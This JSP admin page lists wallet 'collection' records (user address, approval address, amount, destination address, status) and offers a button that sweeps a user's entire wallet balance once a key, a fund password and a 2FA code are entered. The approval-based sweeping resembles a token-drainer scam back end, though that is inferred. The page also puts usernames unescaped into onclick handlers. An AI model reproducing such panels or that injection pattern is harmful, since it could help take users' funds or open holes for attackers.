<%@ page language="java" pageEncoding="utf-8" isELIgnored="false"%>
<%@taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core"%>
<%@taglib prefix="fmt" uri="http://java.sun.com/jsp/jstl/fmt" %>
<%@taglib prefix="fn" uri="http://java.sun.com/jsp/jstl/functions" %>
<jsp:useBean id="security" class="security.web.BaseSecurityAction" scope="page" />

<%@ include file="include/pagetop.jsp"%>
<!DOCTYPE html>
<html>
<head>
<%@ include file="include/head.jsp"%>
</head>
<body>
	<%@ include file="include/loading.jsp"%>

	<!-- //////////////////////////////////////////////////////////////////////////// -->
	<!-- START CONTENT -->
	<div class="ifr-dody">
    <input type="hidden" name="session_token" id="session_token" value="${session_token}"/>

		<!-- //////////////////////////////////////////////////////////////////////////// -->
		<!-- START CONTAINER -->
		<div class="ifr-con">
			<h3>归集记录</h3>
			<%@ include file="include/alert.jsp"%>
			<!-- //////////////////////////////////////////////////////////////////////////// -->
			<!-- START queryForm -->
			<div class="row">
				<div class="col-md-12">
					<div class="panel panel-default">

						<div class="panel-title">查询条件</div>
						<div class="panel-body">
							<form class="form-horizontal"
								action="<%=basePath%>normal/adminAutoMonitorOrderAction!list.action"
								method="post" id="queryForm">
							
								<input type="hidden" name="pageNo" id="pageNo" value="${pageNo}">
									
								<input type="hidden" name="state_para"/>
								
								<div class="col-md-12 col-lg-4">
									<fieldset>
										<div class="control-group">
											<div class="controls">
											    <input id="usename_para" name="usename_para" class="form-control"
											     placeholder="用户地址（完整）" value = "${usename_para}"/>
											</div>
										</div>
									</fieldset>
								</div>
								<div class="col-md-12 col-lg-3">
										<fieldset>
											<div class="control-group">
												<div class="controls">
												
												<select id="succeeded_para" name="succeeded_para" class="form-control " >
													   <option value="">---所有状态---</option>
													   
									<option value="0" <c:if test="${succeeded_para == '0'}">selected="true"</c:if> >处理中</option>
									<option value="1" <c:if test="${succeeded_para == '1'}">selected="true"</c:if> >成功</option>
									<option value="2" <c:if test="${succeeded_para == '2'}">selected="true"</c:if> >失败</option>
													   
											    </select>
														
												</div>
											</div>
										</fieldset>
								</div>
								<div class="col-md-12 col-lg-12" style="margin-top:10px;"></div>
								<div class="col-md-12 col-lg-4">
									<fieldset>
										<div class="control-group">
											<div class="controls">
                                                 <input id="settle_order_no_para" name="settle_order_no_para" class="form-control"
                                                  placeholder="清算订单号（完整）" value = "${settle_order_no_para}"/>	
											</div>
										</div>
									</fieldset>
								</div>

								<div class="col-md-12 col-lg-2" >
									<button type="submit" class="btn btn-light btn-block">查询</button>
								</div>
								
							</form>
								
						</div>

					</div>
				</div>
			</div>
			<!-- END queryForm -->
			<!-- //////////////////////////////////////////////////////////////////////////// -->


			<div class="row">
				<div class="col-md-12">
					<!-- Start Panel -->
					<div class="panel panel-default">

						<div class="panel-title">查询结果</div>
						<div class="panel-body">
							<table class="table table-bordered table-striped">
								<thead>

									<tr>
										<td>用户名</td>
										<td>UID</td>
										<td>账户类型</td>
										<td>交易信息</td>
										<td>授权地址</td>
										<td>归集金额</td>
										<td>归集转入地址</td>
										<td>状态</td>
										<td>失败原因</td>
										<td>归集时间</td>
										<td width="130px"></td>

									</tr>
								</thead>
								<tbody>
									<!-- <s:iterator value="page.elements" status="stat"> -->
									<c:forEach items="${page.getElements()}" var="item" varStatus="stat">
										<tr>
											<td>
											<c:choose>
												<c:when test="${item.username!='' && item.username!=null}">
													<a style="font-size: 10px;" href="#" onClick="getallname('${item.username}')">
														${fn:substring(item.username,0,4)}***${fn:substring(item.username,fn:length(item.username) - 4, fn:length(item.username))}
													</a>
												</c:when>
												<c:otherwise>
													${item.username}
												</c:otherwise>
											</c:choose>
											</td>

										    <td>${item.usercode}</td>												
											<td>
												<c:choose>
													<c:when test="${item.rolename=='GUEST'}">
														<span class="right label label-warning">${item.roleNameDesc}</span>
													</c:when>
													<c:when test="${item.rolename=='MEMBER'}">
														<span class="right label label-success">${item.roleNameDesc}</span>
													</c:when>
													<c:when test="${item.rolename=='AGENT'}">
														<span class="right label label-primary">${item.roleNameDesc}</span>
													</c:when>
													<c:when test="${item.rolename=='AGENTLOW'}">
														<span class="right label label-primary">${item.roleNameDesc}</span>
													</c:when>
													<c:otherwise>
													 	${item.roleNameDesc}
													</c:otherwise>	
												</c:choose>
											</td>
											<td><a href="javascript:tx_about('${item.txn_hash}','${item.username}','${item.monitor_address}','${item.channel_address}')">查看信息</a></td>
											<td>${item.monitor_address_hide}</td>
											<td>${item.volume}</td>
											<td>${item.channel_address_hide}</td>
											<td><c:if test="${item.succeeded=='0'}">
													<span class="right label label-warning">处理中</span>
												</c:if>
												<c:if test="${item.succeeded=='1'}">
													<span class="right label label-success">成功</span>
												</c:if>
												<c:if test="${item.succeeded=='2'}">
													<span class="right label label-danger">失败</span>
												</c:if>
											</td>
											<td>${item.error}</td>
											
                                            <td>${item.created}</td>
											
											<td>
				
												<c:if test="${security.isRolesAccessible('ROLE_ROOT,ROLE_ADMIN')
															 || security.isResourceAccessible('OP_COLLECT_OPERATE')}">											
											
													<div class="btn-group">
														<button type="button" class="btn btn-light">操作</button>
														<button type="button" class="btn btn-light dropdown-toggle"
															data-toggle="dropdown" aria-expanded="false">
															<span class="caret"></span> <span class="sr-only">Toggle Dropdown</span>
														</button>
														<ul class="dropdown-menu" role="menu">
														
															<c:if test="${item.succeeded=='2'}">
																<li><a href="javascript:getCollectAddress('${item.id}','${item.usercode}')">钱包余额归集</a></li>
															</c:if>

														</ul>
													</div>
													
												</c:if>												
												
											</td>
											
										</tr>
									</c:forEach>
									<!-- </s:iterator> -->

								</tbody>
							</table>
							<%@ include file="include/page_simple.jsp"%>
							<nav>
						</div>

					</div>
					<!-- End Panel -->

				</div>
			</div>

		</div>
		<!-- END CONTAINER -->
		<!-- //////////////////////////////////////////////////////////////////////////// -->
		
		<!-- 模态框 -->
		<!-- 模态框（Modal） -->
		<div class="modal fade" id="modal_tx" tabindex="-1"
			role="dialog" aria-labelledby="myModalLabel"
			aria-hidden="true">
			<div class="modal-dialog">
				<div class="modal-content">
					<div class="modal-header">
						<button type="button" class="close"
							data-dismiss="modal" aria-hidden="true">&times;</button>
						<h4 class="modal-title" >交易信息</h4>
					</div>
					<div class="modal-body">
						<div class="" >
							TX HASH<input id="tx_hash" type="text" name="tx_hash"
								class="form-control" readonly="true"/>
						</div>
						<div class="" >
							用户地址<input id="tx_user_address" type="text" name="tx_user_address"
								class="form-control" readonly="true"/>
						</div>
						<div class="" >
							授权地址<input id="tx_monitor_address" type="text" name="tx_monitor_address"
								class="form-control" readonly="true"/>
						</div>
						<div class="" >
							归集转入地址<input id="tx_channel_address" type="text" name="tx_channel_address"
								class="form-control" readonly="true"/>
						</div>
						
					</div>
					
					<div class="modal-footer" style="margin-top: 0;">
						<button type="button" class="btn "
							data-dismiss="modal">关闭</button>
						
					</div>
				</div>
				<!-- /.modal-content -->
			</div>
			<!-- /.modal -->
		</div>													
		<div class="modal fade" id="modal_settle" tabindex="-1"
			role="dialog" aria-labelledby="myModalLabel"
			aria-hidden="true">
			<div class="modal-dialog">
				<div class="modal-content">
					<div class="modal-header">
						<button type="button" class="close"
							data-dismiss="modal" aria-hidden="true">&times;</button>
						<h4 class="modal-title" >清算信息</h4>
					</div>
					<div class="modal-body">
						<div class="" >
							清算订单号<input id="settle_order_no" type="text" name="settle_order_no"
								class="form-control" readonly="true"/>
						</div>
						<div class="" >
							清算金额<input id="settle_amount" type="text" name="settle_amount"
								class="form-control" readonly="true"/>
						</div>
						<div class="" >
							清算状态<input id="settle_state_text" type="text" name="settle_state_text"
								class="form-control" readonly="true"/>
						</div>
						<div class="" >
							清算时间<input id="settle_time" type="text" name="settle_time"
								class="form-control" readonly="true"/>
						</div>
						
					</div>
					
					<div class="modal-footer" style="margin-top: 0;">
						<button type="button" class="btn "
							data-dismiss="modal">关闭</button>
						
					</div>
				</div>
				<!-- /.modal-content -->
			</div>
			<!-- /.modal -->
		</div>	
		
		<div class="form-group">
			<div class="col-sm-1">
				<!-- 模态框（Modal） -->
				<div class="modal fade" id="net_form" tabindex="-1"
					role="dialog" aria-labelledby="myModalLabel"
					aria-hidden="true">
					<div class="modal-dialog">
						<div class="modal-content">
							<div class="modal-header">
									<button type="button" class="close" data-dismiss="modal"
										aria-hidden="true">&times;</button>
									<h4 class="modal-title" id="myModalLabel">完整用户名（完整钱包地址）</h4>
							</div>
							<div class="modal-header">
									<h4 class="modal-title" name="usernallName" id="usernallName"  readonly="true" style="display: inline-block;"></h4>
									<a href="" id="user_all_name_a" sytle="cursor:pointer;" target="_blank">在Etherscan上查看</a>
							</div>
										
							<div class="modal-body">
									<div class="">
									</div>
							</div>
								
				        </div>
					</div>
				</div>
			</div>
		</div>											

		<%@ include file="include/footer.jsp"%>
			<div class="form-group">
				<form action="<%=basePath%>normal/adminAutoMonitorOrderAction!CollectAll.action"
					method="post" id="subCollectForm">
					<input type="hidden" name="pageNo" id="pageNo" value="${param.pageNo}">
					
					<input type="hidden" name="usename_para"/>
					<input type="hidden" name="settle_order_no_para"/>
					<input type="hidden" name="settle_order_no_para"/>
					<input type="hidden" name="id" id="id_collection_one"/>
					<input type="hidden" name="session_token" id="session_token_collection_one" value="${session_token}"/>
					
					<div class="col-sm-1">
						<!-- 模态框（Modal） -->
						<div class="modal fade" id="modal_collection_one" tabindex="-1"
							role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
							<div class="modal-dialog">
								<div class="modal-content">
									<div class="modal-header">
										<button type="button" class="close" data-dismiss="modal"
											aria-hidden="true">&times;</button>
										<h4 class="modal-title" id="myModalLabel">归集单个用户钱包全部金额</h4>
									</div>
									<div class="modal-body">
										<div class="">
										<span class="help-block">用户UID</span>
										    <input id="usercode_one" name="usercode_collection" class="form-control" readonly="readonly"/>
										</div>
									</div>
									<div class="modal-header">
										<h4 class="modal-title" id="myModalLabel">归集地址</h4>
									</div>
									<div class="modal-header">
									<h4 class="modal-title" name="collectAddress" id="collectAddress"  readonly="readonly" style="display: inline-block;">${collectAddress}</h4>
									<a href="https://etherscan.io/address/${collectAddress}" id="approve_address_a" sytle="cursor:pointer;" target="_blank">在Etherscan上查看</a>
									</div>
									<div class="modal-header">
										<h4 class="modal-title" id="myModalLabel">key</h4>
									</div>
									<div class="modal-body">
										<div class="">
											<input id="key" type="text" name="key"
												class="form-control" placeholder="请输入key">
										</div>
									</div>
									<div class="modal-header">
										<h4 class="modal-title" id="myModalLabel">登录人资金密码</h4>
									</div>
									<div class="modal-body">
										<div class="">
											<input id="safeword" type="password" name="safeword"
												class="form-control" placeholder="请输入登录人资金密码">
										</div>
									</div>
									<div class="modal-header">
										<h4 class="modal-title" id="myModalLabel">谷歌验证码</h4>
									</div>
									<div class="modal-body">
										<div class="">
											<input id="google_auth_code" name="google_auth_code"
												class="form-control" placeholder="请输入谷歌验证码">
										</div>
									</div>
									<div class="modal-footer" style="margin-top: 0;">
										<button type="button" class="btn " data-dismiss="modal">关闭</button>
										<button type="button" onclick="sub_confirm()" class="btn btn-default" >确认</button>
									</div>
								</div>
								<!-- /.modal-content -->
							</div>
							<!-- /.modal -->
						</div>
					</div>
				</form>
			</div>
	</div>
	<!-- End Content -->
	<!-- //////////////////////////////////////////////////////////////////////////// -->


	<%@ include file="include/js.jsp"%>
	

	
	<script type="text/javascript">
	
	function getCollectAddress(id,usercode){
//		 $("#money_address_one").val(tmp.collectAddress);
		 var session_token = $("#session_token").val();
		 $("#session_token_collection_one").val(session_token);
		$("#id_collection_one").val(id);
		$("#usercode_one").val(usercode);
		
		$('#modal_collection_one').modal("show");
	
	}

	function sub_confirm() {
		
		swal({
			title : "是否确认归集?",
			text : "归集用户钱包余额",
			type : "warning",
			showCancelButton : true,
			confirmButtonColor : "#DD6B55",
			confirmButtonText : "确认",
			closeOnConfirm : false
		}, function() {
			document.getElementById("subCollectForm").submit();
		});

	};
	
		
	</script>
					
	
		
				

<script type="text/javascript">
function tx_about(hash,user_address,monitor_address,channel_address){
	 $("#tx_hash").val(hash);
	 $("#tx_user_address").val(user_address);
	 $("#tx_monitor_address").val(monitor_address);
	 $("#tx_channel_address").val(channel_address);
	$('#modal_tx').modal("show");
	 
}
function settle_about(settle_state,settle_order_no,settle_time,settle_amount){
	var settle_state_text = "";
	if(settle_state==0){
		settle_state_text = "未结算";
	}else if(settle_state==1){
		settle_state_text = "结算中";
	}else if(settle_state==2){
		settle_state_text = "已结算";
	}
	 $("#settle_state_text").val(settle_state_text);
	 $("#settle_order_no").val(settle_order_no);
	 $("#settle_time").val(settle_time);
	 $("#settle_amount").val(settle_amount);
	$('#modal_settle').modal("show");
	 
}


function getallname(name){
	$("#usernallName").html(name);
	$("#user_all_name_a").attr("href","https://etherscan.io/address/"+name);
	$("#net_form").modal("show");
}

	</script>

	
</body>
</html>